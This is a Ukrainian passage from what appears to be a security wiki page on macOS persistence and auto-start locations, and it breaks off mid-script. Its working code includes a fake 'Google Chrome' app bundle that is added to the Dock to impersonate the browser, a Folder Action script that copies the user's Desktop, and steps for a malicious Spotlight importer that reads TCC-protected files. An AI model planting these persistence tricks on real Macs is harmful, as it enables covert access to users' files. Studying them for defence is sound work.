- `019bdcd2` — час у hex. Він позначає кількість хвилин, що минули від epoch. `0x019bdcd2` у десятковій системі — це `26991826`. Якщо помножити це на 60, отримаємо `1619509560`, тобто `GMT: 2021. April 27., Tuesday 7:46:00`.

Якщо вивести вміст файлу завдання, побачимо ту саму інформацію, що й за допомогою `at -c`.

### Сповіщення Calendar про відкриття файлу

- **Ціль запису:** виконуваний пакет програми або інший файл, **вже вибраний** у спеціальному сповіщенні Calendar **Open file**. Для створення або редагування самого сповіщення потрібен доступ до відповідної події календаря через Calendar або схвалене джерело даних календаря; довільний запис файлу не створює сповіщення.
- **Тригер:** запланований час сповіщення на Mac, де Calendar обробляє подію. Повторювана подія може повторно виконувати цю дію. [Актуальний посібник Calendar від Apple](https://support.apple.com/guide/calendar/icl1012/mac) підтверджує наявність опції сповіщення **Custom → Open file** у macOS 26.
- **Ідентичність виконання та обмеження:** Calendar відкриває вибраний файл для користувача, що ввійшов у систему, за допомогою пов’язаної з ним програми. Запуск пакета програми може виконати її код від імені цього користувача з урахуванням Gatekeeper, quarantine та інших перевірок macOS. Звичайний файл сценарію може лише відкритися в редакторі; його розширення саме по собі не доводить виконання коду.

Щоб безпечно оцінити потенційну ціль, перевірте сповіщення події в Calendar і дозволи вибраного файлу. Цей шлях задокументовано за посібником Apple і **не** перевірено на дослідницькому Mac, оскільки тестування змінило б активний календар і вимагало б очікування події на робочому столі. У тимчасовому обліковому записі можна вибрати пакет програми, що створює лише маркер, налаштувати сповіщення Open file на найближчий час, підтвердити запуск, а потім видалити подію та програму.

### Автоматизації Shortcuts у macOS

- **Ціль запису:** виконуваний файл, **на який уже посилається** дія shortcut, або наявний shortcut, який може редагувати авторизований користувач. Довільний файл `.shortcut` або запис у недокументовану базу даних Shortcuts не є підтримуваним способом реєстрації автоматизації.
- **Тригер та ідентичність:** раніше налаштована й увімкнена подія автоматизації, наприклад певний час доби або подія програми, запускає shortcut для користувача, що ввійшов у систему. [Актуальний посібник Apple з автоматизації на Mac](https://support.apple.com/guide/shortcuts-mac/add-automations-apdfbdbd7123/mac) перелічує підтримувані події, пояснює, коли автоматизація може запускатися без запиту, і описує видалення тригера. [Посібник Apple з приватності Shortcuts](https://support.apple.com/guide/shortcuts-mac/apdfeb05586f/mac) вимагає ввімкнути **Allow Running Scripts** для дій зі сценаріями, а окремі дії все одно можуть запитувати дозволи.

Це умовний шлях від запису до виконання, **лише якщо наявна дія завантажує ціль, доступну для запису**. Створення автоматизації через UI змінює активні налаштування, і на дослідницькому Mac цього не робили. У тимчасовому обліковому записі власник може налаштувати shortcut на певний час доби, сценарій якого створює файл-маркер `/tmp/ht-shortcuts-marker`, увімкнути потрібні дозволи, перевірити наявність маркера після події, а потім видалити автоматизацію, shortcut і маркер.

### Дії Automator і Quick Actions

- **Цілі запису:** `~/Library/Automator/*.action` (користувач) і `/Library/Automator/*.action` (адміністратор) для пакетів дій. Збережений workflow Quick Action зазвичай міститься в `~/Library/Services/*.workflow`; перевірте фактичний шлях workflow, вибраний користувачем. [Довідник фреймворку Automator від Apple](https://developer.apple.com/documentation/automator) перелічує каталоги пошуку дій.
- **Тригер:** Automator завантажує доступні пакети дій під час запуску, але завдання дії виконується, коли запускається workflow, що її використовує. Quick Action запускається, коли користувач вибирає її у Finder, Services або іншому доступному меню. Workflow Folder Action запускається, коли елементи додаються до її **вже підключеної** папки, а workflow Calendar Alarm — у час події. [Типи workflow від Apple](https://support.apple.com/guide/automator/aut7cac58839/mac) розрізняють ці події. Сам запис дії або workflow не підключає папку й не планує подію календаря.
- **Ідентичність виконання та обмеження:** обліковий запис, від імені якого запускається workflow; Automator або програма, що його викликає, має завантажити дію, а поточні перевірки підпису коду та приватності мають дозволити її виконання. Запис у пакет дії, на який уже посилається активний workflow, — це інший випадок, ніж встановлення нової дії та очікування її вибору.

На тестовому Mac із macOS 26.5.2 були присутні користувацькі каталоги `Automator` і `Services`; `/Library/Automator` був відсутній. Жодного активного workflow не створювали, не підключали й не запускали. Щоб перевірити конкретний шлях завантаження, скористайтеся тимчасовим обліковим записом і дією/workflow, що створює лише маркер. В окремому розділі [Folder Actions](#folder-actions) докладніше розглянуто це джерело подій.

### Folder Actions

Опис: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)<sup>[[17]](#references)</sup>\
Опис: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)<sup>[[18]](#references)</sup>

- Корисно для обходу sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Але для налаштування Folder Actions потрібно мати змогу викликати `osascript` з аргументами, щоб звертатися до **`System Events`**
- Обхід TCC: [🟠](https://emojipedia.org/large-orange-circle)
  - Має деякі базові дозволи TCC, зокрема доступ до Desktop, Documents і Downloads

#### Розташування

- **`/Library/Scripts/Folder Action Scripts`**
  - Потрібен root
  - **Тригер**: доступ до вказаної папки
- **`~/Library/Scripts/Folder Action Scripts`**
  - **Тригер**: доступ до вказаної папки

#### Опис і експлуатація

Folder Actions — це сценарії, які автоматично запускаються у відповідь на зміни в папці, наприклад додавання чи видалення елементів, або інші дії, як-от відкриття чи зміна розміру вікна папки. Ці дії можна використовувати для різних завдань, а запускати їх можна різними способами, наприклад через Finder UI або команди термінала.<sup>[[17]](#references)[[18]](#references)</sup>

Для налаштування Folder Actions можна:

1. Створити workflow Folder Action за допомогою [Automator](https://support.apple.com/guide/automator/welcome/mac) і встановити його як службу.
2. Вручну підключити сценарій через Folder Actions Setup у контекстному меню папки.
3. Використати OSAScript для надсилання повідомлень Apple Event до `System Events.app`, щоб програмно налаштувати Folder Action.
   - Цей спосіб особливо корисний для вбудовування дії в систему, забезпечуючи певний рівень persistence.

Наведений нижче сценарій є прикладом того, що може виконувати Folder Action:

```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```

Щоб зробити наведений вище скрипт придатним для використання з Folder Actions, скомпілюйте його за допомогою:

```bash
osacompile -l JavaScript -o folder.scpt source.js
```

Після компіляції скрипту налаштуйте Дії папок, виконавши наведений нижче скрипт. Він глобально ввімкне Дії папок і призначить раніше скомпільований скрипт папці «Стільниця».

```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```

Запустіть скрипт налаштування за допомогою:

```bash
osascript -l JavaScript /Users/username/attach.scpt
```

- Ось як реалізувати persistence через GUI:

Ось скрипт, який буде виконано:

```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```

Скомпілюйте його за допомогою: `osacompile -l JavaScript -o folder.scpt source.js`

Перемістіть його до:

```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```

Потім відкрийте програму `Folder Actions Setup`, виберіть **папку, за якою потрібно стежити**, а потім виберіть у вашому випадку **`folder.scpt`** (у моєму випадку я назвав файл `output2.scp`):

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

Тепер, якщо відкрити цю папку у **Finder**, ваш скрипт виконається.

Ця конфігурація зберігалася у **plist** за адресою **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** у форматі base64.

А тепер спробуймо налаштувати цю persistence без доступу до GUI:

1. **Скопіюйте `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** у `/tmp`, щоб створити резервну копію:
   - `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Видаліть** щойно створені Folder Actions:

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

Тепер у нас чисте середовище.

3. Скопіюйте файл резервної копії: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Відкрийте Folder Actions Setup.app, щоб застосувати цю конфігурацію: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> У мене це не спрацювало, але ось інструкції з writeup:(

### Ярлики Dock

Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)<sup>[[19]](#references)</sup>

- Корисно для обходу sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Але вам потрібно встановити шкідливу програму в системі
- Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Розташування

- `~/Library/Preferences/com.apple.dock.plist`
  - **Тригер**: коли користувач натискає на програму в Dock

#### Опис та експлуатація

Усі програми, які відображаються в Dock, зазначені у файлі plist: **`~/Library/Preferences/com.apple.dock.plist`**<sup>[[19]](#references)</sup>

**Додати програму** можна просто за допомогою:

```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```

За допомогою **соціальної інженерії** можна **видати себе, наприклад, за Google Chrome у Dock** і фактично виконати власний скрипт:

```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Google Chrome</string>
    <key>CFBundleIdentifier</key>
    <string>com.google.Chrome</string>
    <key>CFBundleName</key>
    <string>Google Chrome</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```

### Методи введення

- **Ціль запису:** пакет програми методу введення з кодом, встановлений у `~/Library/Input Methods/` (користувач) або `/Library/Input Methods/` (адміністратор). Це відрізняється від звичайних текстових файлів зі зіставленням клавіш Apple `.inputplugin`, які самі по собі не є довільним виконуваним кодом.
- **Тригер:** користувач додає/вмикає джерело введення в **Системні параметри → Клавіатура → Введення тексту**, а потім вибирає або використовує його. Сам факт копіювання пакета до каталогу не є доказом, що macOS запустить його. У [поточному посібнику Apple щодо джерел введення](https://support.apple.com/guide/mac-help/mchl84525d76/mac) описано ввімкнення та перемикання джерел; у [документації Apple щодо InputMethodKit](https://developer.apple.com/documentation/inputmethodkit) описано методи введення з кодом.
- **Ідентичність виконання та обмеження:** метод запускається для користувача, який увійшов у систему, з урахуванням реєстрації методу введення, підпису коду та поточних перевірок безпеки macOS. Для наявних увімкнених методів із виконуваним файлом, доступним для запису, потрібна окрема перевірка шляхів і підписів.

У [старій примітці Apple про сторонні методи введення](https://developer.apple.com/library/archive/qa/qa1810/_index.html) уже попереджали, що копіювання певних методів палітри до цих каталогів навіть не призводить до їх появи в розділі «Джерела введення». На дослідницькому Mac із macOS 26.5.2 каталог користувача існує, але жодного пакета не було встановлено чи активовано, тож це задокументований умовний шлях, а не результат локального тестування під час виконання.

### Засоби вибору кольору

Writeup: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)<sup>[[20]](#references)</sup>

- Корисно для bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Має відбутися дуже конкретна дія
  - Ви опинитеся в іншому sandbox
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Розташування

- `/Library/ColorPickers`
  - Потрібен root
  - Тригер: використання засобу вибору кольору
- `~/Library/ColorPickers`
  - Тригер: використання засобу вибору кольору

#### Опис і Exploit

**Зберіть пакет засобу вибору кольору** зі своїм кодом (наприклад, можна використати [**цей**](https://github.com/viktorstrate/color-picker-plus)) і додайте конструктор (як у розділі [Screen Saver](macos-auto-start-locations.md#screen-saver)), а потім скопіюйте пакет до `~/Library/ColorPickers`.<sup>[[20]](#references)</sup>

Тоді, коли буде викликано засіб вибору кольору, ваш пакет теж має виконатися.

Це залежить від того, чи відкриє сумісна програма системну панель вибору кольору та чи вибере встановлений засіб. У [посібнику Apple з панелі вибору кольору](https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/DrawColor/Tasks/AddingColorPickers.html) описано застарілі розташування пакетів. Локальна перевірка шляхів виявила застарілу службу XPC для вибору кольору, але на дослідницькому Mac жодного засобу вибору не було встановлено чи завантажено; не робіть висновок про TCC bypass лише на підставі наявності шляху.

Зауважте, що бінарний файл, який завантажує вашу бібліотеку, має **дуже обмежувальний sandbox**: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`

```bash
[Key] com.apple.security.temporary-exception.sbpl
	[Value]
		[Array]
			[String] (deny file-write* (home-subpath "/Library/Colors"))
			[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
			[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```

### Finder Sync Plugins

**Опис**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)<sup>[[21]](#references)</sup>\
**Опис**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)<sup>[[22]](#references)</sup>

- Корисно для обходу sandbox: **Ні, оскільки потрібно запустити власний застосунок**
- Обхід TCC: залежить від sandbox і дозволів увімкненого розширення; універсального обходу не встановлено.

#### Розташування

- Конкретний застосунок

#### Опис і експлуатація

Приклад застосунку з Finder Sync Extension [**можна знайти тут**](https://github.com/D00MFist/InSync).

Застосунки можуть містити `Finder Sync Extensions`. Це розширення буде вбудовано в застосунок, який запускатиметься. Крім того, щоб розширення могло виконувати свій код, воно **має бути підписане** дійсним сертифікатом розробника Apple, **ізольоване в sandbox** (хоча можна додати менш суворі винятки) та зареєстроване за допомогою чогось на кшталт:<sup>[[21]](#references)[[22]](#references)</sup>

Встановлене розширення також потрібно **увімкнути** й викликати для відповідного розташування або елемента Finder; створення довільного пакета `.appex` недостатньо. [Finder Sync API від Apple](https://developer.apple.com/documentation/findersync/fifindersynccontroller/isextensionenabled) надає доступ до стану ввімкнення. Наведені нижче команди `pluginkit` демонструють явну реєстрацію та ввімкнення, а не автозапуск лише через наявність файлу. Цей спосіб перевірили за документацією; на дослідницькому Mac не встановлювали й не вмикали нових розширень.

```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```

### Заставка екрана

Опис: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)<sup>[[23]](#references)</sup>\
Опис: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)<sup>[[24]](#references)</sup>

- Корисно для обходу sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Але в результаті ви опинитеся в звичайному sandbox програми
- Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Розташування

- `/System/Library/Screen Savers`
  - Потрібні права root
  - **Умова запуску**: Вибрати заставку екрана
- `/Library/Screen Savers`
  - Потрібні права root
  - **Умова запуску**: Вибрати заставку екрана
- `~/Library/Screen Savers`
  - **Умова запуску**: Вибрати заставку екрана

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### Опис і експлуатація

Створіть новий проєкт у Xcode і виберіть шаблон для створення нової **заставки екрана**. Потім додайте до неї свій код, наприклад, наведений нижче код для створення логів.<sup>[[23]](#references)[[24]](#references)</sup>

**Зберіть** проєкт і скопіюйте пакет `.saver` у **`~/Library/Screen Savers`**. Потім відкрийте графічний інтерфейс заставок екрана й просто натисніть на неї — має з’явитися багато логів:

```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```

> [!CAUTION]
> Зверніть увагу: оскільки в entitlements бінарного файла, який завантажує цей код (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`), є **`com.apple.security.app-sandbox`**, ви будете **всередині загальної пісочниці застосунку**.

Код заставки:

```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    self = [super initWithFrame:frame isPreview:isPreview];
    if (self) {
        [self setAnimationTimeInterval:1/30.0];
    }
    return self;
}

- (void)startAnimation
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super startAnimation];
}

- (void)stopAnimation
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super drawRect:rect];
}

- (void)animateOneFrame
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return;
}

- (BOOL)hasConfigureSheet
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return NO;
}

- (NSWindow*)configureSheet
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```

### Плагіни Spotlight

опис: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)<sup>[[25]](#references)</sup>

- Корисно для обходу sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Але ви опинитеся в sandbox застосунку
- Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)
  - Sandbox має дуже обмежені можливості

#### Розташування

- `~/Library/Spotlight/`
  - **Умова запуску**: Створюється новий файл із розширенням, яке обробляє плагін Spotlight.
- `/Library/Spotlight/`
  - **Умова запуску**: Створюється новий файл із розширенням, яке обробляє плагін Spotlight.
  - Потрібен root
- `/System/Library/Spotlight/`
  - **Умова запуску**: Створюється новий файл із розширенням, яке обробляє плагін Spotlight.
  - Потрібен root
- `Some.app/Contents/Library/Spotlight/`
  - **Умова запуску**: Створюється новий файл із розширенням, яке обробляє плагін Spotlight.
  - Потрібен новий застосунок

#### Опис і експлуатація

Spotlight — це вбудована функція пошуку macOS, створена для забезпечення користувачам **швидкого й повного доступу до даних на їхніх комп’ютерах**.\
Щоб забезпечити такий швидкий пошук, Spotlight підтримує **власну базу даних** і створює індекс, **аналізуючи більшість файлів**, що дає змогу швидко шукати як за назвами файлів, так і за їхнім вмістом.<sup>[[25]](#references)</sup>

В основі механізму Spotlight лежить центральний процес під назвою «mds», що означає **«сервер метаданих»**. Цей процес керує роботою всієї служби Spotlight. Йому допомагають кілька демонів «mdworker», які виконують різні завдання з обслуговування, зокрема індексують файли різних типів (`ps -ef | grep mdworker`). Ці завдання виконуються завдяки плагінам-імпортерам Spotlight, або **пакетам «.mdimporter»**, які дають Spotlight змогу розпізнавати й індексувати вміст у різноманітних форматах файлів.

Плагіни, або пакети **`.mdimporter`**, розташовані у згаданих вище місцях. Щоб пакет було виявлено, він має відповідати типу файлу, а Spotlight має проіндексувати файл відповідного типу; саме копіювання пакета не доводить, що його завантажено. [Довідник Apple щодо MDImporter](https://developer.apple.com/documentation/coreservices/file_metadata/mdimporter) пов’язує завантаження з наявністю відповідного зміненого файлу. Виконання імпортерів Spotlight у macOS 26 тут не перевірялося.

**Знайти всі завантажені `mdimporters`** можна так:

```bash
mdimport -L
Paths: id(501) (
    "/System/Library/Spotlight/iWork.mdimporter",
    "/System/Library/Spotlight/iPhoto.mdimporter",
    "/System/Library/Spotlight/PDF.mdimporter",
    [...]
```

І, наприклад, **/Library/Spotlight/iBooksAuthor.mdimporter** використовується для обробки таких типів файлів (зокрема з розширеннями `.iba` і `.book`):

```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
    0 => {
      "CFBundleTypeName" => "iBooks Author Book"
      "CFBundleTypeRole" => "MDImporter"
      "LSItemContentTypes" => [
        0 => "com.apple.ibooksauthor.book"
        1 => "com.apple.ibooksauthor.pkgbook"
        2 => "com.apple.ibooksauthor.template"
        3 => "com.apple.ibooksauthor.pkgtemplate"
      ]
      "LSTypeIsPackage" => 0
    }
  ]
[...]
 => {
      "UTTypeConformsTo" => [
        0 => "public.data"
        1 => "public.composite-content"
      ]
      "UTTypeDescription" => "iBooks Author Book"
      "UTTypeIdentifier" => "com.apple.ibooksauthor.book"
      "UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
      "UTTypeTagSpecification" => {
        "public.filename-extension" => [
          0 => "iba"
          1 => "book"
        ]
      }
    }
[...]
```

> [!CAUTION]
> Якщо перевірити Plist інших `mdimporter`, можна не знайти запис **`UTTypeConformsTo`**. Це тому, що це вбудований _Uniform Type Identifier_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)), для якого не потрібно вказувати розширення.
>
> Крім того, системні плагіни за замовчуванням завжди мають пріоритет, тому атакувальник може отримати доступ лише до файлів, які не індексуються власними `mdimporter` від Apple.

Щоб створити власний importer, можна почати з цього проєкту: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer), а потім змінити назву, **`CFBundleDocumentTypes`** і додати **`UTImportedTypeDeclarations`**, щоб підтримувати потрібне розширення, та відобразити їх у **`schema.xml`**.\
Потім **змініть** код функції **`GetMetadataForFile`**, щоб виконувати payload, коли створюється файл із відповідним розширенням.

Нарешті, **зіберіть і скопіюйте новий `.mdimporter`** в одне з трьох попередніх розташувань. Перевірити, чи його завантажено, можна **відстежуючи журнали** або виконавши **`mdimport -L`**.

> [!TIP]
> Хоча sandbox importer-а дуже обмежений, `mdworker` індексує файли з **привілейованим доступом на читання**. Тому шкідливий `.mdimporter` може читати *вміст* файлів у розташуваннях, захищених TCC (Downloads, Pictures, Desktop, …), і викрадати зібрані метадані без запиту TCC — це **обхід TCC «Sploitlight» (CVE-2025-31199)**, виправлений у macOS Sequoia 15.4.<sup>[[55]](#references)</sup>

### ~~Панель налаштувань~~

> [!CAUTION]
> Схоже, це більше не працює.

Опис: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)<sup>[[26]](#references)</sup>

- Корисно для обходу sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Потрібна конкретна дія користувача
- Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Розташування

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Опис

Схоже, це більше не працює.<sup>[[26]](#references)</sup>

### Файли скриптів застосунків

Опис: [https://theevilbit.github.io/beyond/beyond_0010/](https://theevilbit.github.io/beyond/beyond_0010/)<sup>[[37]](#references)</sup>

- Корисно для обходу sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Але цільовий застосунок має бути встановлений і запущений/використаний жертвою
- Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Розташування

**Інтерпретований скрипт, який фактично виконує встановлений застосунок або інструмент і який атакувальник може змінити.** Перевірте дозволи файлу та шлях виклику; самого факту наявності файлу `.sh` або `.py` недостатньо. У посібнику Apple з [підписування коду](https://developer.apple.com/library/archive/documentation/Security/Conceptual/CodeSigningGuide/Procedures/Procedures.html) зазначено, що підписані пакети застосунків захищають ресурси, зокрема скрипти. Редагування скрипту всередині пакета порушує цей захист, і під час перевірки пакета це може бути виявлено або заблоковано. Зовнішній скрипт, як-от launcher Homebrew, має інші правила підписування та довіри. Історичні приклади з опису дослідження:

- **`/Applications/Sublime Text.app/Contents/MacOS/sublime.py`** — скрипт, який використовували старіші версії Sublime Text; для встановленої версії слід перевірити наявність файлу та його використання під час запуску. На тестовому Mac його не було.
- **`/opt/homebrew/bin/brew`** (Apple Silicon) або **`/usr/local/bin/brew`** (Intel) — Bash launcher, який виконується під час запуску за відповідним шляхом `brew`, якщо його встановлено й атакувальник має право на запис. На тестовому Mac `/opt/homebrew/bin/brew` був доступним для запису Bash-скриптом; це локальне спостереження, а не загальне правило дозволів Homebrew.
- **`idlemain.py`** у пакеті застосунку Python для IDLE — для запису може знадобитися дозвіл адміністратора, але скрипт виконується з ідентифікатором користувача IDLE.
- **`/Library/Application Support/Wireshark/ChmodBPF/ChmodBPF`** — історичний shell-скрипт, що запускався від root, коли було встановлено відповідне завдання launchd `org.wireshark.ChmodBPF`. На тестовому Mac скрипту й завдання не було.

#### Опис і експлуатація

Деякі інструменти й застосунки виконують інтерпретовані скрипти під час роботи. Скрипт, доступний для запису, може виконати додані команди під час наступного запуску відповідним викликачем, якщо це дозволяють перевірка підпису, карантин та інші перевірки. У початковому дослідженні наведено кілька прикладів інсталяцій 2019 року; повторно перевірте їхні шляхи та тригери у цільовій версії.<sup>[[37]](#references)</sup>

```python
# Marker-only injection test on a COPY of Homebrew's launcher. The relocated
# copy may fail its normal Homebrew logic; the marker checks script execution.
import pathlib, subprocess, tempfile

source = pathlib.Path('/opt/homebrew/bin/brew')
with tempfile.TemporaryDirectory(prefix='ht-script-copy-') as root:
    target = pathlib.Path(root) / 'brew'
    marker = pathlib.Path(root) / 'ran'
    lines = source.read_text().splitlines(keepends=True)
    target.write_text(lines[0] + '/usr/bin/touch ' + str(marker) + '\n' + ''.join(lines[1:]))
    target.chmod(0o700)
    subprocess.run([str(target), '--version'], capture_output=True, timeout=15)
    print('marker fired:', marker.exists())
```

Цей тест копії дав результат `marker fired: True` у macOS 26.5.2; оригінальний launcher не змінювали. Він доводить, що точка вставлення виконується в копії, але не те, що змінений підписаний app bundle або справжнє встановлення Homebrew пройдуть усі перевірки запуску.

### Dock Tile Plugins

Опис: [https://theevilbit.github.io/beyond/beyond_0032/](https://theevilbit.github.io/beyond/beyond_0032/)<sup>[[38]](#references)</sup>

- Корисно для обходу sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Потрібно, щоб app, у якому оголошено plug-in, було виявлено/зареєстровано, а plug-in обробив Dock
  - Plug-in завантажується в **підписаний Apple** helper, який не має entitlement для app-sandbox і має **вимкнену перевірку бібліотек**. У цитованому дослідженні цей helper не відображався в інтерфейсі Background Task Management; його видимість у цільовому релізі слід перевірити.
- Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Розташування

- **`<App>.app/Contents/PlugIns/<name>.docktileplugin`**, на який посилається ключ **`NSDockTilePlugIn`** в `Info.plist` app; власний `Info.plist` plug-in задає **`NSPrincipalClass`**.

#### Опис та експлуатація

Якщо app оголошує `NSDockTilePlugIn`, Dock може завантажити вказаний bundle у XPC helper **`com.apple.dock.external.extra`** (`...extra.arm64` на Apple Silicon) під час входу в систему або додавання його плитки; сам app запускати не потрібно. Для цього macOS має виявити/зареєструвати app і прийняти його. Helper **підписаний Apple**, не має entitlement `com.apple.security.app-sandbox` і має `com.apple.security.cs.disable-library-validation`. Під час завантаження викликається метод **`setDockTile:`** головного класу; звідти він може підписатися на розподілені сповіщення (наприклад, `com.apple.screenIsLocked`) для подальших подій.<sup>[[38]](#references)</sup>

У macOS 26.5.2 перевірка `codesign` лише для читання підтвердила підпис Apple та entitlements helper-а, а в кількох установлених app було оголошено `NSDockTilePlugIn`. На цьому Mac не встановлювали й не завантажували жодного нового plug-in, тож виконання щойно створеного bundle у цьому релізі залишається неперевіреним.

```bash
# Enumerate apps already shipping a Dock tile plugin (hijack / template targets)
for a in /Applications/*.app /System/Applications/*.app; do
